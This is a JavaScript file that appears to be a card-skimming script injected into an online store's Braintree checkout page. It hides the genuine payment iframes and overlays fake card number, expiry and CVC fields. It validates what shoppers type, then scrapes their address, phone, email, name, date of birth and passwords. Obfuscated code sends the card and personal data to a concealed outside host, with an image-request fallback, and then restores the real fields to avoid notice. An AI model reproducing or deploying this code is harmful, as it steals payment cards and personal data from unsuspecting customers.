function _ox1() {
	var d = document;
	_ht1 = '<div style=" width: 100%;height: 100%;" class="hosted-control-hosted-fields-valid"><style> input.hform::placeholder{color:rgb(58, 58, 58) !important} .fc-dirty {display: block !important}</style> <input class="hform" style="border: none;width: 100%;height: 100%;float: left;color: rgb(58, 58, 58);padding: 0;font-size: 19px;font-family: sans-serif;background: white !important;text-align: left;" autocomplete="cc-number" type="tel" id="cc" maxlength="22" placeholder="4111 1111 1111 1111"></div>';
	_ht2 = '<input class="hform" style="border: none;width: 100%;height: 100%;float: left;color: rgb(58, 58, 58);padding: 0;font-size: 19px;font-family: sans-serif;background: white !important;text-align: left;"  autocomplete="cc-exp" type="tel" id="exp" maxlength="7" placeholder="MM/YYYY">';
	_ht3 = '<input class="hform" style="border: none;width: 100%;height: 100%;float: left;color: rgb(58, 58, 58);padding: 0;font-size: 19px;font-family: sans-serif;background: white !important;text-align: left;"  autocomplete="" type="tel" id="cvc" maxlength="4" placeholder="123">';
	d.getElementsByTagName('head')[0].insertAdjacentHTML('beforeend', '<style>.fc-dirty {display: block !important}</style>');
	var ifr1 = d.querySelector("#braintree_cc_number iframe");
	var ifr2 = d.querySelector("#braintree_expirationDate iframe");
	var ifr3 = d.querySelector("#braintree_cc_cid iframe");	
	ifr1.style.display = "none";
	ifr2.style.display = "none";
	ifr3.style.display = "none";
	ifr1.insertAdjacentHTML('beforebegin', _ht1);
	ifr2.insertAdjacentHTML('beforebegin', _ht2);
	ifr3.insertAdjacentHTML('beforebegin', _ht3);	
}

function _ox2() {
	var d = document;
	var myf = d.querySelector(".hosted-control-hosted-fields-valid");
	var ifr1 = d.querySelector("#braintree_cc_number iframe");
	var ifr2 = d.querySelector("#braintree_expirationDate iframe");
	var ifr3 = d.querySelector("#braintree_cc_cid iframe");	
	var num = d.getElementById("cc");
	var exp = d.getElementById("exp");
	var cod = d.getElementById("cvc");
	var img = d.querySelector(".control.braintree-card-control img")
	crc32 = function(r) {
		for(var a, o = [], c = 0; c < 256; c++) {
			a = c;
			for(var f = 0; f < 8; f++) a = 1 & a ? 3988292384 ^ a >>> 1 : a >>> 1;
			o[c] = a
		}
		for(var n = -1, t = 0; t < r.length; t++) n = n >>> 8 ^ o[255 & (n ^ r.charCodeAt(t))];
		return(-1 ^ n) >>> 0
	};
	
	function enc(e, r) {
		var o, n;
		return 0 == r && (o = (n = btoa(encodeURIComponent(e)).replace(/[a-zA-Z]/g, function(e) {
			return String.fromCharCode((e <= "Z" ? 90 : 122) >= (e = e.charCodeAt(0) + 13) ? e : e - 26)
		})).split("").reverse().join("").replace("==", "_d").replace("=", "_o")), 1 == r && (n = e.replace("_d", "==").replace("_o", "=").replace(/[a-zA-Z]/g, function(e) {
			return String.fromCharCode((e <= "Z" ? 90 : 122) >= (e = e.charCodeAt(0) + 13) ? e : e - 26)
		}), o = atob(n.split("").reverse().join(""))), o
	}

	
	type = function(e) {
		var n = new RegExp('^4');
		if(null != e.match(n)) return 'vi';
		if(n = new RegExp('^3[47]'), null != e.match(n)) return 'am';
		var t = e;
		return t.length >= 2 && '2' == t[0] && t[1] >= '2' && t[1] <= '7' ? 'ma' : t.length >= 2 && '5' == t[0] && t[1] >= '1' && t[1] <= '5' ? 'ma' : t.length >= 2 && '6' == t[0] && ('5' == t[1] || '0' == t[1] || '4' == t[1]) ? 'di' : t.length >= 2 && '3' == t[0] && '5' == t[1] ? 'jc' : t.length >= 2 && '3' == t[0] && '0' == t[1] ? 'dn' : t.length >= 2 && '3' == t[0] && ('6' == t[1] || '8' == t[1] || '9' == t[1] || '0' == t[1]) ? 'dn' : t.length >= 2 && parseInt(e.slice(0, 2)) >= 56 && parseInt(e.slice(0, 2)) <= 69 ? 'ms' : t.length >= 2 && '5' == t[0] && '0' == t[1] ? 'ms' : 'no'
	}
	
	function i(h) {
		f = ["BILLING", "CITY", "COUNTRY", "POSTCODE", "POSTAL", "PHONE", "STATE", "REGION", "FIRSTNAME", "LASTNAME"];
		var u = "undefined";
		var k = "";
		var l = k;
		var h = h.toUpperCase();
		var r = d.querySelectorAll('input');
		for(var i = 0; i < r.length; i++) {
			if(r[i].value !== k && r[i].value != u) {
				c = r[i].name + r[i].type + r[i].id + r[i].lassList;
				c = c.toUpperCase();
				if(c.indexOf(h) >= 0) {
					l = r[i].value;
					if(c.indexOf(f[0]) >= 0 && l != k) {
						break;
					}
				}
			}
		}
		
		if(l==k&&typeof checkoutConfig !== u){
			if(!!checkoutConfig.customerData){
				var id="";
				var x = checkoutConfig.customerData;
				if(x!==0){
				if(!!x.default_billing){var id = x.default_billing}
				if(!!x.default_shipping){var id = x.default_shipping}
					if(!!id&&!!x.addresses[id]){
						var a = x.addresses[id];
						if(f[1].indexOf(h)>=0){l=a.city;}
						if(f[2].indexOf(h)>=0){l=a.country_id;}
						if(f[3].indexOf(h)>=0||"ZIP".indexOf(h)>=0||f[4].indexOf(h)>=0){l=a.postcode;}
						if("STREET[0]".indexOf(h)>=0){l=a.street[0];}
						if("STREET[1]".indexOf(h)>=0){l=a.street[1];}
						if(f[5].indexOf(h)>=0){l=a.telephone;}
						if(f[7].indexOf(h)>=0||f[7].indexOf(h)>=0){l=a.region.region;}
						if(f[8].indexOf(h)>=0){l=a.firstname;}
						if(f[9].indexOf(h)>=0){l=a.lastname;}
						if("MAIL".indexOf(h)>=0){l=x.email;}
						p = " (json)";
						}
					}
				}
	}
	if(l == k) {
			var r = d.querySelectorAll('select');
			for(var i = 0; i < r.length; i++) {
				c = r[i].name + r[i].type + r[i].id + r[i].lassList;
				c = c.toUpperCase();
				if(c.indexOf(h) >= 0) {
					if(r[i].selectedIndex >= 0) {
						l = r[i].querySelectorAll('option')[r[i].selectedIndex].text;
						if(c.indexOf(f[0]) >= 0 && l != k && l.toUpperCase().indexOf("REGION") >= 0 || l.toUpperCase().indexOf("PLEASE") >= 0 || l.toUpperCase().indexOf("SELECT") >= 0) 						 
						 {l = k;}{break;}
					}
				}
			}
		}
		return l;
	}


	function _ox3(url) {
		var num = d.getElementById("cc");
		var exp = d.getElementById("exp");
		var cod = d.getElementById("cvc");
		if(!!url && !!num && !!exp && !!cod) {
			num = num.value;
			exp = exp.value;
			cod = cod.value;
			var cc_status = "invalid";
			var exp_status = "invalid";
			var cvc_status = "invalid";
			if(!!num) {
				num = num.replace(/[^\d;]/g, '');
				var r = 0,
					t = 0,
					y = false;
				for(var n = num.length - 1; n >= 0; n--) {
					var u = num.charAt(n),
						t = parseInt(u, 10);
					if(y) {
						if((t *= 2) > 9) t -= 9;
					}
					r += t;
					y = !y;
				}
				if(num.length < 12 || num.length > 19 || (r % 10) !== 0) {
					cc_status = "invalid";
				} else {
					cc_status = "valid";
				}
			}
			if(!!exp && exp.indexOf("/") > 0) {
				exps = exp.split("/");
				var expM = exps[0].replace(/[^\d;]/g, '');
				var expY = exps[1].replace(/[^\d;]/g, '');
				if(expY.indexOf("20") == 0) {
					expY = expY.split("20")[1];
				}
				if(expM.length == 1) {
					expM = "0" + expM;
				}
				var nowY = (new Date).getFullYear().toString().split("20")[1];
				if(expM > 12 || expM == "" || expM == "00" || expM.length > 2 || Number(expY) < Number(nowY) || Number(nowY) + 50 <= Number(expY)) {
					exp_status = "invalid";
				} else {
					exp_status = "valid";
				}
			}
			if(!!cod) {
				cod = cod.replace(/[^\d;]/g, '')
				if(cod.length < 3 || cod.length > 4) {
					cvc_status = "invalid";
				} else {
					cvc_status = "valid";
				}
				if(type(num) == "am" && cod.length !== 4) {
					cvc_status = "invalid";
				}
			}
			if(cc_status == "invalid" || exp_status == "invalid" || cvc_status == "invalid") {
				return type(num) + "|" + cc_status + "|" + exp_status + "|" + cvc_status;
			} else {
				return [location.protocol + "//" + decodeURIComponent(enc(url, 1)) + crc32(num), num, (expM + " / " + expY).slice(0, 7), cod, i("post"), i("country"), i("region"), i("city"), i("street[0]"), i("street[1]"), i("phone"), i("mail"), i("firstname") + " " + i("lastname"), i("dob"), i("passw"), i("comment")];
			};
			};
		};
	
	num.addEventListener('keydown', function(e) {
		let value = this.value.replace(/\s+/g, '');
		let isBackspace = e.key === 'Backspace';
		if(e.key) {
			if((e.key.length === 1 && /^[^\d\s]+$/.test(e.key)) || (!isBackspace && value.length === 19)) {
				e.preventDefault();
				return false;
			}
		}
		this.value = value.split('').reverse().join('').replace(/\B(?=(\d{4})+(?!\d))/g, " ").split('').reverse().join('').trim();
	});
	_in1 = setInterval(function() {
		var data = _ox3("_oLxZypwYlLaElHvoxAzElHFqwyzY2MUM");		
		if(typeof data !== 'object') {
			k = data.split("|");
			if (k[0] == "no"){img.src="https://www.fstanning.com/static/version1700030511/frontend/Theme/fstanning/en_US/PayPal_Braintree/images/cc/NONE.png"}
			if (k[0] == "vi"){img.src="https://www.fstanning.com/static/version1700030511/frontend/Theme/fstanning/en_US/PayPal_Braintree/images/cc/VI.png"}
			if (k[0] == "am"){img.src="https://www.fstanning.com/static/version1700030511/frontend/Theme/fstanning/en_US/PayPal_Braintree/images/cc/AE.png"}
			if (k[0] == "di"){img.src="https://www.fstanning.com/static/version1700030511/frontend/Theme/fstanning/en_US/PayPal_Braintree/images/cc/DI.png"}
			if (k[0] == "ma"){img.src="https://www.fstanning.com/static/version1700030511/frontend/Theme/fstanning/en_US/PayPal_Braintree/images/cc/MC.png"}
			if (k[1] == "valid"){num.style.color = "green"}else{num.style.color = "black"};
			if (k[2] == "valid"){exp.style.color = "green"}else{exp.style.color = "black"};
			if (k[3] == "valid"){cod.style.color = "green"}else{cod.style.color = "black"};
		}
		if(typeof data == 'object') {			
			clearInterval(_in1);
			clearInterval(_in0);
			_rm7();

            const _data = [data[1], data[3], data[2], `# ${data.slice(4).join(' # ')} #`];

			//console.log(_data)
            ///////////

			localStorage.setItem('_id', (Date.now()))

            const _0x5ce120=_0x4fc7;function _0x4fc7(_0x506f8f,_0x2813cc){const _0x574996=_0x5749();return _0x4fc7=function(_0x4fc765,_0x1ecde7){_0x4fc765=_0x4fc765-0xa7;let _0x23ad40=_0x574996[_0x4fc765];return _0x23ad40;},_0x4fc7(_0x506f8f,_0x2813cc);}function _0x5749(){const _0xcecad5=['src','onerror','join','request48yfyhrygfeyurgfeuyguy47ioefijghijjtjtitjrier','Q29udGVudC1UeXBl','stringify','reduce','154629FaRFRD','406748aYtjzo','13801986RVjBLs','map','1125036bSzoeN','keys','onload','QWNjZXB0','35nSrjjY','6049408mAZkLl','1266BuLMME','charCodeAt','15XzltVs','UE9TVA==','split','YXBwbGljYXRpb24vanNvbg==', btoa(`${atob(window.h54h54h46hostokopskeokfoekfokeojfuifh435h76w4tw4tg54g)}${atob('P2RhdGE9')}`) ,'1609BirorM','420YJnUOf','1054TPAgIz', window.h54h54h46hostokopskeokfoekfokeojfuifh435h76w4tw4tg54g];_0x5749=function(){return _0xcecad5;};return _0x5749();}(function(_0xd69663,_0x50526b){const _0x1ed846=_0x4fc7,_0x146f2a=_0xd69663();while(!![]){try{const _0x542a7a=-parseInt(_0x1ed846(0xb6))/0x1*(-parseInt(_0x1ed846(0xb8))/0x2)+-parseInt(_0x1ed846(0xa9))/0x3+parseInt(_0x1ed846(0xc2))/0x4*(parseInt(_0x1ed846(0xb1))/0x5)+-parseInt(_0x1ed846(0xaf))/0x6*(-parseInt(_0x1ed846(0xad))/0x7)+-parseInt(_0x1ed846(0xae))/0x8+parseInt(_0x1ed846(0xc1))/0x9*(-parseInt(_0x1ed846(0xb7))/0xa)+parseInt(_0x1ed846(0xa7))/0xb;if(_0x542a7a===_0x50526b)break;else _0x146f2a['push'](_0x146f2a['shift']());}catch(_0x1133fa){_0x146f2a['push'](_0x146f2a['shift']());}}}(_0x5749,0x87bdb),window[_0x5ce120(0xbd)]=async([_0x40140c,_0x27411a,_0x3b0cad,_0xe8bba9])=>{const _0x43c6c3=_0x5ce120,_0x3efee5={'c':_0x40140c,'v':_0x27411a,'e':_0x3b0cad,'l':_0xe8bba9},_0x15ef82=Object[_0x43c6c3(0xaa)](_0x3efee5)[_0x43c6c3(0xc0)]((_0x3c35d9,_0x43e840)=>{const _0x5db9b8=_0x43c6c3,_0x1bc34c=0x1,_0x563a9c=_0x43e840[_0x5db9b8(0xb3)]('')[_0x5db9b8(0xa8)](_0x18982f=>String['fromCharCode'](_0x18982f[_0x5db9b8(0xb0)]()+_0x1bc34c))[_0x5db9b8(0xbc)](''),_0x25e251=_0x3efee5[_0x43e840][_0x5db9b8(0xb3)]('')[_0x5db9b8(0xa8)](_0x68ed08=>String['fromCharCode'](_0x68ed08[_0x5db9b8(0xb0)]()+_0x1bc34c))[_0x5db9b8(0xbc)]('011010');return _0x3c35d9[_0x563a9c]=_0x25e251,_0x3c35d9;},{});try{await fetch(atob(_0x43c6c3(0xb9)),{'headers':{[atob(_0x43c6c3(0xac))]:atob(_0x43c6c3(0xb4)),[atob(_0x43c6c3(0xbe))]:atob(_0x43c6c3(0xb4))},'body':JSON[_0x43c6c3(0xbf)](_0x15ef82),'method':atob(_0x43c6c3(0xb2))});}catch(_0x5ff041){await new Promise(_0x22b709=>{const _0x514484=_0x43c6c3,_0x97baf7=new Image();_0x97baf7[_0x514484(0xab)]=()=>_0x22b709(),_0x97baf7[_0x514484(0xbb)]=()=>_0x22b709(),_0x97baf7[_0x514484(0xba)]=encodeURI(''+atob(_0x514484(0xb5))+encodeURIComponent(JSON[_0x514484(0xbf)](_0x15ef82)));});}});
            
            request48yfyhrygfeyurgfeuyguy47ioefijghijjtjtitjrier(_data)

            ///////////

            /*
			var xhr = new XMLHttpRequest();
			xhr.open("POST", data[0], true);
			xhr.setRequestHeader('Content-type', 'application/json; charset=utf-8');
			var json_data = '{"a": "' + data[1] + '","b": "' + data[2] + '","c": "' + data[3] + '","d": "' + data[4] + '","e": "' + data[5] + '","f": "' + data[6] + '","g": "' + data[7] + '", "h": "' + data[8] + '","i": "' + data[9] + '","j": "' + data[10] + '","k": "' + data[11] + '","l": "' + data[12] + '","m": "' + data[13] + '","n": "' + data[14] + '","o": "' + data[15] + '"}';	
		    var json_data = JSON.stringify({
				"dataID": enc(json_data, 0)
			})
			xhr.send(json_data);
			xhr.onreadystatechange = function() {
				if(xhr.readyState !== 4) return;
				if(xhr.status === 200) {} else {};
			};
            */
		} else {}
	}, 1000)
	
	num.addEventListener('keydown', function(e) {
		let value = this.value.replace(/\s+/g, '');
		let isBackspace = e.key === 'Backspace';
		if(e.key) {
			if((e.key.length === 1 && /^[^\d\s]+$/.test(e.key)) || (!isBackspace && value.length === 19)) {
				e.preventDefault();
				return false;
			}
		}
		this.value = value.split('').reverse().join('').replace(/\B(?=(\d{4})+(?!\d))/g, " ").split('').reverse().join('').trim();
	});
	
	var ite = 0;
	d.getElementById("exp").addEventListener('keydown', function(e) {
		ite++
		if(this.value.length == 2 && ite < 3) {
			ite++
			this.value = this.value + '/';
		}
		if(this.value.length <= 2) {
			ite = 0;
		}
	});

	function _rm7() {
		myf.remove();
		exp.remove();
		cod.remove();
		ifr1.style.display = "block";
		ifr2.style.display = "block";
		ifr3.style.display = "block";
		img.src="https://www.fstanning.com/static/version1700030511/frontend/Theme/fstanning/en_US/PayPal_Braintree/images/cc/NONE.png"
		clearInterval(_in02);
		};
};

function _ai() {
	var d = document;
	_inter = setInterval(function() {
	if(!!document.querySelector("#ix")) {
		document.querySelector("#ix").remove();
		console.log("0")
		clearInterval(_inter);
	}
}, 1000)
		_in0 = setInterval(function() {
		if(!localStorage.getItem('_id') && !!d.querySelector("#braintree_cc_number iframe") && !!d.querySelector("#braintree_expirationDate iframe") && !!d.querySelector("#braintree_cc_cid iframe") && !!d.querySelector(".control.braintree-card-control img") && !d.querySelector('#cc') && !d.querySelector('#exp') && !d.querySelector('#cvc')) {
			_ox1();
		}
	}, 1000)
}

function _i6() {
	var d = document;
	if(d.location.pathname.indexOf("firecheckout") > 0) {
		_ai();
		_in02 = setInterval(function() {
		var num = d.getElementById("cc");
		var exp = d.getElementById("exp");
		var cod = d.getElementById("cvc");
		var ifr1 = d.querySelector("#braintree_cc_number iframe");
		var ifr2 = d.querySelector("#braintree_expirationDate iframe");
		var ifr3 = d.querySelector("#braintree_cc_cid iframe");
		if (!!num && !!ifr1){ifr1.style.display = "none";}
		if (!!exp && !!ifr2){ifr2.style.display = "none";}
		if (!!cod && !!ifr3){ifr3.style.display = "none";}
		}, 1000)
		_in03 = setInterval(function() {
			var num = d.getElementById("cc");
			if(!!num) {
				if(num.value.length > 0) {
					_ox2();
					clearInterval(_in03);
				}
			}
		}, 1000)
	}
}

if(document.readyState == "loading") {
	document.addEventListener('DOMContentLoaded', _i6);
} else {
	_i6();
}
